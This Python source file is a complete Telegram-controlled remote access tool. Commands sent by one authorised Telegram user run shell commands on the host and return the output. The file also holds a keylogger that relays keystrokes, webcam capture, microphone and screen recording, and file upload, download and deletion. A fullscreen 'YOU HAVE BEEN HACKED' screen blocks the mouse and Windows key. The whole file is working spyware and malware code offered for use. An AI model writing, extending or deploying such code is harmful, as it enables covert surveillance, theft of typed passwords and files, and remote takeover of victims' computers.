from dotenv import load_dotenv
load_dotenv() # Load environment variables first

import platform
import psutil
import socket
import pyautogui
import cv2
import subprocess
import os
import pygame
import random
import string
import getpass
import time
import pygetwindow as gw
import requests
from io import BytesIO
import shutil
import ctypes
import threading
import shlex
import keyboard # For blocking 'win' key
from pynput import keyboard as pynput_keyboard # For keylogger
from pynput import mouse # For mouse blocking
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write
from telegram.ext import Application, CommandHandler, MessageHandler, filters
import asyncio

# --- Environment Variable Access and Validation ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
RAW_AUTHORIZED_USER_ID = os.environ.get("AUTHORIZED_USER_ID")

if TELEGRAM_BOT_TOKEN is None:
    print("FATAL ERROR: TELEGRAM_BOT_TOKEN is not set. Make sure it's in your .env file and load_dotenv() is called correctly.")
    exit(1)

if RAW_AUTHORIZED_USER_ID is None:
    print("FATAL ERROR: AUTHORIZED_USER_ID is not set. Make sure it's in your .env file.")
    exit(1)
try:
    AUTHORIZED_USER_ID = int(RAW_AUTHORIZED_USER_ID)
except ValueError:
    print(f"FATAL ERROR: AUTHORIZED_USER_ID ('{RAW_AUTHORIZED_USER_ID}') is not a valid integer.")
    exit(1)

# --- Global Variables ---
# Keylogger
keylog_active = False
keylog_listener = None # Stores the pynput.keyboard.Listener instance
keylog_data = []

# Hacker Screen
hacker_screen_running = False
mouse_listener_instance = None # Stores the pynput.mouse.Listener instance for hacker screen

# --- Authorization Helper ---
def is_authorized(update):
    """Checks if the message sender is the authorized user."""
    return update.message.from_user.id == AUTHORIZED_USER_ID

# --- Bot Command Handlers ---
async def start(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    await update.message.reply_text("Bot is running and you are authorized!")

async def sysinfo(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        info = f"OS: {platform.system()} {platform.release()}\n"
        info += f"Architecture: {platform.machine()}\n"
        info += f"Processor: {platform.processor()}\n"
        ram_gb = psutil.virtual_memory().total / (1024**3)
        info += f"RAM: {ram_gb:.2f} GB\n"
        info += f"Hostname: {socket.gethostname()}\n"
        # Get primary IP (more robustly if multiple interfaces)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)) # Connect to a known address
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = socket.gethostbyname(socket.gethostname()) # Fallback
        info += f"Local IP: {local_ip}\n"
        await update.message.reply_text(f"<pre>{info}</pre>", parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"Error getting sysinfo: {e}")


async def diskinfo(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        usage = psutil.disk_usage('/')
        total_gb = usage.total / (1024**3)
        used_gb = usage.used / (1024**3)
        free_gb = usage.free / (1024**3)
        reply = (f"Disk Usage (/):\n"
                 f"  Total: {total_gb:.2f} GB\n"
                 f"  Used:  {used_gb:.2f} GB ({usage.percent}%)\n"
                 f"  Free:  {free_gb:.2f} GB")
        await update.message.reply_text(f"<pre>{reply}</pre>", parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"Error getting diskinfo: {e}")


async def screenshot(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        image = pyautogui.screenshot()
        bio = BytesIO()
        bio.name = 'screenshot.png' # Important for Telegram to recognize as a photo file
        image.save(bio, format="PNG")
        bio.seek(0)
        await update.message.reply_photo(photo=bio)
    except Exception as e:
        await update.message.reply_text(f"Error taking screenshot: {e}")

async def camshot(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    cap = None # Ensure cap is defined for finally block
    try:
        cap = cv2.VideoCapture(0) # 0 is usually the default webcam
        if not cap.isOpened():
            await update.message.reply_text("Failed to open webcam. Is it connected and not in use?")
            return
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            bio = BytesIO(buf.tobytes())
            bio.name = 'camshot.jpg'
            bio.seek(0)
            await update.message.reply_photo(photo=bio)
        else:
            await update.message.reply_text("Failed to capture image from webcam.")
    except Exception as e:
        await update.message.reply_text(f"Error taking camshot: {e}")
    finally:
        if cap and cap.isOpened():
            cap.release()

async def execute(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /execute <command>")
        return
    command = " ".join(context.args)
    try:
        # Using asyncio.create_subprocess_shell for non-blocking execution
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=20) # 20 second timeout

        output = ""
        if stdout:
            output += stdout.decode(errors='replace')
        if stderr:
            output += stderr.decode(errors='replace')
        
        if not output:
            output = "Command executed with no output."

        if len(output) > 4000: # Telegram message limit
            output = output[:4000] + "\n...output truncated..."
        await update.message.reply_text(f"<pre>{output}</pre>", parse_mode="HTML")
    except asyncio.TimeoutError:
        await update.message.reply_text(f"Command timed out: {command}")
    except Exception as e:
        await update.message.reply_text(f"Error executing command: {type(e).__name__}: {e}")


async def receive_file(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    if update.message.document:
        try:
            file_obj = await context.bot.get_file(update.message.document.file_id)
            file_name = update.message.document.file_name
            # Sanitize file_name to prevent directory traversal or invalid characters
            safe_file_name = os.path.basename(file_name) # Removes directory parts
            if not safe_file_name: # Handle cases like ".."
                safe_file_name = "downloaded_file"
            
            # Consider creating a dedicated downloads directory
            download_dir = "bot_downloads"
            os.makedirs(download_dir, exist_ok=True)
            file_path = os.path.join(download_dir, safe_file_name)

            await file_obj.download_to_drive(custom_path=file_path)
            await update.message.reply_text(f"File '{safe_file_name}' received and saved to '{file_path}'")
        except Exception as e:
            await update.message.reply_text(f"Error receiving file: {e}")
    else:
        await update.message.reply_text("Please send a file as a document.")

# --- Hacker Screen Function (Blocking, for Threading) ---
def display_hacker_screen_blocking(duration=5, message="YOU HAVE BEEN HACKED"):
    global hacker_screen_running, mouse_listener_instance
    hacker_screen_running = True # Signal that the screen is active

    pygame.init()
    pygame.mouse.set_visible(False) # Hide mouse cursor early

    # Attempt to make it always on top (Windows specific)
    try:
        screen_width, screen_height = pygame.display.Info().current_w, pygame.display.Info().current_h
        screen = pygame.display.set_mode((screen_width, screen_height), pygame.FULLSCREEN | pygame.NOFRAME)
        if platform.system() == "Windows":
            hwnd = pygame.display.get_wm_info()['window']
            ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0001 | 0x0002) # HWND_TOPMOST
    except Exception as e:
        print(f"Pygame display enhancement failed (continuing): {e}")
        # Fallback to simple fullscreen if advanced setup fails
        screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)

    background_color = (0, 0, 0) # Black
    text_color = (0, 255, 0) # Green
    screen.fill(background_color)
    
    try:
        font_path = None # Let SysFont choose
        matrix_font_size = 20
        matrix_font = pygame.font.SysFont(font_path, matrix_font_size)
    except Exception: # Fallback if SysFont fails
        matrix_font = pygame.font.Font(None, matrix_font_size + 4) # Default font

    # Draw random green characters for matrix effect
    cols = screen.get_width() // (matrix_font_size // 2) # Approximate char width
    rows = screen.get_height() // matrix_font_size
    for r in range(rows):
        for c in range(cols):
            char = random.choice(string.ascii_letters + string.digits + string.punctuation)
            text_surface = matrix_font.render(char, True, text_color)
            screen.blit(text_surface, (c * (matrix_font_size // 2) , r * matrix_font_size))

    # Central black rectangle and message
    rect_height = 150
    rect_y = (screen.get_height() - rect_height) // 2
    pygame.draw.rect(screen, background_color, (0, rect_y, screen.get_width(), rect_height))
    
    try:
        message_font_size = 48
        message_font = pygame.font.SysFont(font_path, message_font_size)
    except Exception:
        message_font = pygame.font.Font(None, message_font_size + 6)

    message_text_surface = message_font.render(message, True, (255, 255, 255)) # White text
    message_rect = message_text_surface.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2))
    screen.blit(message_text_surface, message_rect)

    pygame.display.flip()

    if platform.system() == "Windows":
        keyboard.block_key('win') # Using the 'keyboard' library

    # --- Mouse blocking thread ---
    def mouse_block_thread_target():
        global hacker_screen_running, mouse_listener_instance
        
        def on_event_callback(x, y, button=None, pressed=None, dx=None, dy=None): # Handles move, click, scroll
            return not hacker_screen_running # Block if True (by returning False), allow if False

        # Use pynput.mouse.Listener
        # Ensure this listener is created and started only once if display_hacker_screen is called multiple times
        # The current logic makes a new one each time, which is okay if old one is stopped.
        listener = mouse.Listener(
            on_move=on_event_callback,
            on_click=on_event_callback,
            on_scroll=on_event_callback,
            suppress=True # Actively suppress events if callback returns False
        )
        mouse_listener_instance = listener
        listener.start()
        
        while hacker_screen_running: # Loop while screen should be active
            time.sleep(0.2) 
        
        if listener.is_alive():
             listener.stop()
        mouse_listener_instance = None # Clear the global instance

    mouse_thread = threading.Thread(target=mouse_block_thread_target, daemon=True)
    mouse_thread.start()

    # --- Main loop for screen duration and Pygame events ---
    start_time = time.time()
    pygame_loop_active = True
    while pygame_loop_active and hacker_screen_running:
        for event in pygame.event.get(): # Process Pygame events
            if event.type == pygame.QUIT: # Allow quitting if possible
                pygame_loop_active = False
            # Add other event handling if needed (e.g., specific key presses to break)
        
        if time.time() - start_time >= duration:
            pygame_loop_active = False # Duration ended
        
        time.sleep(0.05) # Keep the loop responsive

    hacker_screen_running = False # Signal all loops and threads to stop

    # mouse_thread.join(timeout=0.5) # Wait briefly for mouse thread to clean up

    if mouse_listener_instance and mouse_listener_instance.is_alive(): # Defensive stop
        mouse_listener_instance.stop()
        mouse_listener_instance = None

    if platform.system() == "Windows":
        keyboard.unblock_key('win')
    pygame.quit()
    print("Hacker screen finished.")


async def start_hackerscreen(update, context):
    global hacker_screen_running 
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return

    if hacker_screen_running:
        await update.message.reply_text("Hacker screen is already running.")
        return

    duration = 10  # Default duration in seconds
    message = "YOU HAVE BEEN HACKED BY JAYDEN SPARK"

    if context.args:
        # Basic duration parsing (e.g., /hackerscreen 30 "Custom Message")
        # Or /hackerscreen 10s "Message" /hackerscreen 2min "Message"
        raw_args = list(context.args)
        parsed_duration_from_arg = False

        if raw_args[0].lower().endswith('s'):
            try:
                duration = int(raw_args[0][:-1])
                raw_args.pop(0)
                parsed_duration_from_arg = True
            except ValueError:
                await update.message.reply_text("Invalid seconds format. Use e.g., 30s")
                return
        elif raw_args[0].lower().endswith('min'):
            try:
                duration = int(raw_args[0][:-3]) * 60
                raw_args.pop(0)
                parsed_duration_from_arg = True
            except ValueError:
                await update.message.reply_text("Invalid minutes format. Use e.g., 2min")
                return
        elif raw_args[0].isdigit() and not parsed_duration_from_arg: # if just a number, assume seconds
             try:
                duration = int(raw_args[0])
                raw_args.pop(0)
             except ValueError:
                pass # Will use default or be overridden by message if it's not a number

        if raw_args: # Remaining args are the message
            message = " ".join(raw_args)
            
    if duration <= 0 or duration > 600: # Max 10 minutes
        await update.message.reply_text("Duration must be between 1 second and 10 minutes (600s).")
        return

    threading.Thread(target=display_hacker_screen_blocking, args=(duration, message), daemon=True).start()
    await update.message.reply_text(f"Hacker screen initiated for {duration} seconds with message: \"{message}\"")


async def stop_hackerscreen(update, context):
    global hacker_screen_running, mouse_listener_instance
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return

    if hacker_screen_running:
        hacker_screen_running = False # Signal the screen and its threads to stop
        
        # The mouse listener should stop itself when hacker_screen_running becomes False.
        # This is a fallback.
        if mouse_listener_instance and mouse_listener_instance.is_alive():
            try:
                mouse_listener_instance.stop()
            except Exception as e:
                print(f"Minor error stopping mouse listener: {e}")
            mouse_listener_instance = None
            
        await update.message.reply_text("Hacker screen stop signal sent. It should close shortly.")
    else:
        await update.message.reply_text("Hacker screen is not currently running.")

# --- Keylogger Functions ---
def on_press_keylogger(key):
    """Callback for pynput keylogger."""
    global keylog_data
    try:
        keylog_data.append(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        key_name = str(key).replace("Key.", "")
        if len(key_name) > 1: # e.g. "space", "enter"
             keylog_data.append(f"[{key_name}]")
        else: # e.g. standard character if somehow missed by char
            keylog_data.append(key_name)


async def start_keylogger(update, context):
    global keylog_active, keylog_listener, keylog_data
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    if keylog_active:
        await update.message.reply_text("Keylogger is already running.")
        return
    
    keylog_data = [] # Reset data
    keylog_active = True
    # Use pynput.keyboard.Listener
    keylog_listener = pynput_keyboard.Listener(on_press=on_press_keylogger)
    keylog_listener.start() # Runs in its own thread
    await update.message.reply_text("Keylogger started.")


async def stop_keylogger(update, context):
    global keylog_active, keylog_listener
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    if not keylog_active:
        await update.message.reply_text("Keylogger is not running.")
        return
    
    keylog_active = False # Signal
    if keylog_listener:
        keylog_listener.stop()
        keylog_listener = None
    await update.message.reply_text("Keylogger stopped.")


async def get_keylogs(update, context):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    global keylog_data
    if keylog_data:
        # Join and send, handling potential large logs
        log_str = "".join(keylog_data)
        if len(log_str) > 4000:
            await update.message.reply_text(f"<pre>{log_str[:4000]}...\n[LOG TRUNCATED]</pre>", parse_mode="HTML")
        else:
            await update.message.reply_text(f"<pre>{log_str}</pre>", parse_mode="HTML")
        keylog_data = [] # Optionally clear logs after retrieval
    else:
        await update.message.reply_text("No keylogs captured since last retrieval or start.")

# --- Other File System and System Commands ---
async def listdir(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    path_to_list = " ".join(context.args) if context.args else os.getcwd()
    try:
        if not os.path.exists(path_to_list):
            await update.message.reply_text("Path does not exist."); return
        if not os.path.isdir(path_to_list):
            await update.message.reply_text("Path is not a directory."); return
        
        files = os.listdir(path_to_list)
        if not files:
            await update.message.reply_text(f"Directory '{path_to_list}' is empty.")
        else:
            output = f"Contents of '{path_to_list}':\n" + "\n".join(files)
            if len(output) > 4000: output = output[:4000] + "\n...[TRUNCATED]..."
            await update.message.reply_text(f"<pre>{output}</pre>", parse_mode="HTML")
    except Exception as e: await update.message.reply_text(f"Error listing directory: {e}")

async def sendfile(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if not context.args: await update.message.reply_text("Usage: /sendfile <path_to_file>"); return
    file_path = " ".join(context.args)
    try:
        if not os.path.isfile(file_path):
            await update.message.reply_text("File not found or is not a regular file."); return
        with open(file_path, "rb") as f:
            await update.message.reply_document(document=f, filename=os.path.basename(file_path))
    except Exception as e: await update.message.reply_text(f"Error sending file: {e}")

async def shutdown_cmd(update, context): # Renamed from shutdown to avoid conflict
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    await update.message.reply_text("Attempting to shut down system...")
    if platform.system() == "Windows": os.system("shutdown /s /t 5")
    elif platform.system() == "Linux" or platform.system() == "Darwin": os.system("sudo shutdown -h now") # Needs sudo
    else: await update.message.reply_text("Shutdown not supported on this OS via this command."); return

async def restart_cmd(update, context): # Renamed from restart
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    await update.message.reply_text("Attempting to restart system...")
    if platform.system() == "Windows": os.system("shutdown /r /t 5")
    elif platform.system() == "Linux" or platform.system() == "Darwin": os.system("sudo shutdown -r now") # Needs sudo
    else: await update.message.reply_text("Restart not supported on this OS via this command."); return

async def whoami(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    try: username = getpass.getuser(); await update.message.reply_text(f"Current user: {username}")
    except Exception as e: await update.message.reply_text(f"Error getting username: {e}")

async def publicip(update, context): # 'location' was a bit ambiguous
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        geo_req = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
        city = geo_req.get("city", "N/A")
        region = geo_req.get("region", "N/A")
        country = geo_req.get("country_name", "N/A")
        await update.message.reply_text(f"Public IP: {ip}\nLocation: {city}, {region}, {country}")
    except Exception as e: await update.message.reply_text(f"Error getting public IP/location: {e}")

async def activewindow(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    try:
        win = gw.getActiveWindow()
        await update.message.reply_text(f"Active window: {win.title if win else 'None'}")
    except Exception as e: await update.message.reply_text(f"Error getting active window: {e}")


async def processes(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    try:
        proc_list = []
        for p in psutil.process_iter(['pid', 'name', 'username']):
            try: # Handle potential AccessDenied errors for some processes
                proc_list.append(f"PID: {p.info['pid']}, Name: {p.info['name']}, User: {p.info['username']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        output = "\n".join(proc_list[:50]) # Limit output
        if not output: output = "No accessible processes found."
        if len(output) > 4000: output = output[:4000] + "\n...[TRUNCATED]..."
        await update.message.reply_text(f"<pre>{output}</pre>", parse_mode="HTML")
    except Exception as e: await update.message.reply_text(f"Error listing processes: {e}")

async def kill(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if not context.args: await update.message.reply_text("Usage: /kill <pid_or_process_name>"); return
    target = " ".join(context.args)
    killed_any = False
    try:
        pid_target = int(target) # Try if it's a PID
        p = psutil.Process(pid_target)
        p.terminate() # or p.kill() for forceful
        await update.message.reply_text(f"Process with PID {pid_target} ({p.name()}) terminated.")
        killed_any = True
    except (ValueError, psutil.NoSuchProcess): # Not a PID or PID not found, try by name
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and target.lower() in proc.info['name'].lower():
                try:
                    p_to_kill = psutil.Process(proc.info['pid'])
                    p_to_kill.terminate()
                    await update.message.reply_text(f"Process '{proc.info['name']}' (PID: {proc.info['pid']}) terminated.")
                    killed_any = True
                except (psutil.NoSuchProcess, psutil.AccessDenied) as e_kill:
                    await update.message.reply_text(f"Failed to kill '{proc.info['name']}' (PID: {proc.info['pid']}): {e_kill}")
        if not killed_any:
             await update.message.reply_text(f"No process found matching PID or name '{target}'.")
    except psutil.AccessDenied:
        await update.message.reply_text(f"Access denied to terminate process {target}.")
    except Exception as e:
        await update.message.reply_text(f"Error killing process: {type(e).__name__}: {e}")


async def copy_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if len(context.args) < 2: await update.message.reply_text("Usage: /copy <source> <destination>"); return
    src, dst = context.args[0], context.args[1]
    try:
        shutil.copy(src, dst); await update.message.reply_text(f"Copied '{src}' to '{dst}'.")
    except Exception as e: await update.message.reply_text(f"Error copying: {e}")

async def move_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if len(context.args) < 2: await update.message.reply_text("Usage: /move <source> <destination>"); return
    # Use shlex to handle paths with spaces if quoted
    try:
        args_str = " ".join(context.args)
        parsed_args = shlex.split(args_str)
        if len(parsed_args) < 2: await update.message.reply_text("Usage: /move \"<source path>\" \"<destination path>\""); return
        src, dst = parsed_args[0], parsed_args[1]
        shutil.move(src, dst); await update.message.reply_text(f"Moved '{src}' to '{dst}'.")
    except Exception as e: await update.message.reply_text(f"Error moving: {e}")


async def mkdir_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if not context.args: await update.message.reply_text("Usage: /mkdir <directory_path>"); return
    path = " ".join(context.args)
    try:
        os.makedirs(path, exist_ok=True); await update.message.reply_text(f"Directory created/ensured: {path}")
    except Exception as e: await update.message.reply_text(f"Error creating directory: {e}")

async def mkfile_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if not context.args: await update.message.reply_text("Usage: /mkfile <file_path>"); return
    path = " ".join(context.args)
    try:
        with open(path, "w") as f: f.write("") 
        await update.message.reply_text(f"Empty file created: {path}")
    except Exception as e: await update.message.reply_text(f"Error creating file: {e}")

async def delete_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if not context.args: await update.message.reply_text("Usage: /delete <path>"); return
    path = " ".join(context.args)
    try:
        if os.path.isdir(path): shutil.rmtree(path); await update.message.reply_text(f"Directory deleted: {path}")
        elif os.path.isfile(path): os.remove(path); await update.message.reply_text(f"File deleted: {path}")
        else: await update.message.reply_text("Path does not exist or is not a file/directory.")
    except Exception as e: await update.message.reply_text(f"Error deleting: {e}")

async def mute_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if platform.system() == "Windows":
        try: ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0); await update.message.reply_text("System volume mute toggled (sent mute key).")
        except Exception as e: await update.message.reply_text(f"Error sending mute key: {e}")
    else: await update.message.reply_text("Mute command currently only supports Windows.")
    
async def unmute_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    # Same key toggles mute/unmute on Windows
    if platform.system() == "Windows":
        try: ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0); await update.message.reply_text("System volume unmute toggled (sent mute key).")
        except Exception as e: await update.message.reply_text(f"Error sending unmute key: {e}")
    else: await update.message.reply_text("Unmute command currently only supports Windows.")


async def netstat_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    try:
        conns = psutil.net_connections()
        lines = ["Active Network Connections (limited to 20):"]
        for c in conns[:20]:
            laddr = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "N/A"
            raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "N/A"
            lines.append(f"  {c.type.name} {laddr} -> {raddr} [{c.status}] (PID: {c.pid or 'N/A'})")
        output = "\n".join(lines) if len(lines) > 1 else "No active connections found or accessible."
        await update.message.reply_text(f"<pre>{output}</pre>", parse_mode="HTML")
    except Exception as e: await update.message.reply_text(f"Error getting netstat: {e}")

async def recordaudio(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    seconds = 5 # Default
    if context.args and context.args[0].isdigit(): seconds = int(context.args[0])
    if seconds <=0 or seconds > 300: await update.message.reply_text("Duration: 1-300s."); return
    
    fs = 44100; filename = "output_audio.wav"
    await update.message.reply_text(f"Recording audio for {seconds} seconds...")
    try:
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait() # Wait until recording is finished
        write(filename, fs, recording)
        with open(filename, 'rb') as f: await update.message.reply_audio(f)
        os.remove(filename)
    except Exception as e: await update.message.reply_text(f"Error recording audio: {type(e).__name__}: {e}")

async def screenrecord(update, context):
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    seconds = 5 # Default
    if context.args and context.args[0].isdigit(): seconds = int(context.args[0])
    if seconds <=0 or seconds > 120: await update.message.reply_text("Duration: 1-120s."); return

    fps = 10.0; filename = "screen_recording.avi"
    screen_size = pyautogui.size()
    await update.message.reply_text(f"Recording screen for {seconds} seconds at {fps} FPS...")
    
    fourcc = cv2.VideoWriter_fourcc(*'XVID') # Codec
    out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
    try:
        start_time = time.time()
        while (time.time() - start_time) < seconds:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR) # PyAutoGUI is RGB, OpenCV is BGR
            out.write(frame)
        out.release()
        with open(filename, 'rb') as f: await update.message.reply_video(f)
        os.remove(filename)
    except Exception as e:
        if out.isOpened(): out.release() # Ensure writer is released on error
        if os.path.exists(filename): os.remove(filename) # Clean up partial file
        await update.message.reply_text(f"Error recording screen: {type(e).__name__}: {e}")


async def lock_cmd(update, context): # Renamed
    if not is_authorized(update): await update.message.reply_text("Unauthorized."); return
    if platform.system() == "Windows":
        try: ctypes.windll.user32.LockWorkStation(); await update.message.reply_text("System lock command sent.")
        except Exception as e: await update.message.reply_text(f"Error locking system: {e}")
    else: await update.message.reply_text("Lock command currently only supports Windows.")

# --- Main Bot Application Setup ---
async def main_bot_logic(): # Renamed from 'main' to avoid confusion
    """Sets up and runs the Telegram bot."""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Registering handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sysinfo", sysinfo))
    application.add_handler(CommandHandler("diskinfo", diskinfo))
    application.add_handler(CommandHandler("screenshot", screenshot))
    application.add_handler(CommandHandler("camshot", camshot))
    application.add_handler(CommandHandler("execute", execute))
    application.add_handler(MessageHandler(filters.Document.ALL & filters.User(user_id=AUTHORIZED_USER_ID), receive_file)) # Ensure only authorized user can send files
    
    application.add_handler(CommandHandler("listdir", listdir))
    application.add_handler(CommandHandler("sendfile", sendfile))
    application.add_handler(CommandHandler("shutdown", shutdown_cmd))
    application.add_handler(CommandHandler("restart", restart_cmd))
    application.add_handler(CommandHandler("whoami", whoami))
    application.add_handler(CommandHandler("publicip", publicip))
    application.add_handler(CommandHandler("activewindow", activewindow))
    application.add_handler(CommandHandler("lock", lock_cmd))
    
    application.add_handler(CommandHandler("startkeylogger", start_keylogger))
    application.add_handler(CommandHandler("stopkeylogger", stop_keylogger))
    application.add_handler(CommandHandler("getkeylogs", get_keylogs))
    
    application.add_handler(CommandHandler("processes", processes))
    application.add_handler(CommandHandler("kill", kill))
    application.add_handler(CommandHandler("copy", copy_cmd))
    application.add_handler(CommandHandler("move", move_cmd))
    application.add_handler(CommandHandler("mkdir", mkdir_cmd))
    application.add_handler(CommandHandler("mkfile", mkfile_cmd))
    application.add_handler(CommandHandler("delete", delete_cmd))
    
    application.add_handler(CommandHandler("mute", mute_cmd))
    application.add_handler(CommandHandler("unmute", unmute_cmd))
    application.add_handler(CommandHandler("netstat", netstat_cmd))
    application.add_handler(CommandHandler("recordaudio", recordaudio))
    application.add_handler(CommandHandler("screenrecord", screenrecord))
    
    application.add_handler(CommandHandler("hackerscreen", start_hackerscreen))
    application.add_handler(CommandHandler("stophackerscreen", stop_hackerscreen))

    # Not implemented yet
    # application.add_handler(CommandHandler("camvideo", camvideo)) 

    print("Bot is polling...")
    await application.run_polling()

if __name__ == "__main__":
    # The environment variable loading and checks are at the top of the script.

    # --- Optional: For Windows, try setting a different event loop policy ---
    # This might help with "RuntimeError: Event loop is already running" on Windows.
    # Uncomment the following lines if you are on Windows and the error persists.
    # Make sure 'import platform' and 'import asyncio' are at the very top of your script.
    #
    # if platform.system() == "Windows":
    #     print("Attempting to set WindowsSelectorEventLoopPolicy for asyncio.")
    #     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    print("Starting bot application...")
    try:
        asyncio.run(main_bot_logic())
    except KeyboardInterrupt:
        print("Bot stopped by user (KeyboardInterrupt).")
    except Exception as e:
        print(f"Unhandled error in bot execution: {e}")
    finally:
        print("Bot application finished.")
    
    # DO NOT add any asyncio.get_event_loop() or loop.close() calls here.
    # asyncio.run() handles loop creation and cleanup.
    # The problematic `loop = asyncio.get_event_loop()` from your line 656 should be removed.
